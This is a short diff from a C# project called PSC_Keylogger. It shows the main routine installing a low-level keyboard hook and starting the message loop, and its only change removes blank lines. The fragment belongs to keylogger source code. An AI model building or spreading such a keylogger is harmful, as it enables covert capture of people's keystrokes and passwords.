@@ -20,7 +20,5 @@ namespace PSC_Keylogger
             hook = BaseKeylogger.SetHook(BaseKeylogger.llkProcedure);
             Application.Run();
         }
-
-        
     }
 }
